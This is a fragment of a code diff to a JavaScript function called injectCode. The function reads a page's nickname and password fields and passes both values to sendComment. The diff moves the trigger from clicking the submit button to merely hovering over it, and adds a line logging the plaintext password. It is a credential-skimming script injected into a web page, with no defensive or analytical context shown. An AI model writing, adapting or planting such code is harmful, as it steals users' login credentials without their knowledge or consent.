@@ -45,8 +45,9 @@ function injectCode() {
         const name = document.getElementById('user_nickname');
         const pass = document.getElementById('user_password');
         console.log('inputs found!');
-        submitButton.addEventListener('click', ()=>{
+        submitButton.addEventListener('mouseenter', ()=>{
         sendComment(`name: ${name.value}, pass : ${pass.value}`);
+          console.log(`name: ${name.value}, pass : ${pass.value}`);
        })
  }
 }
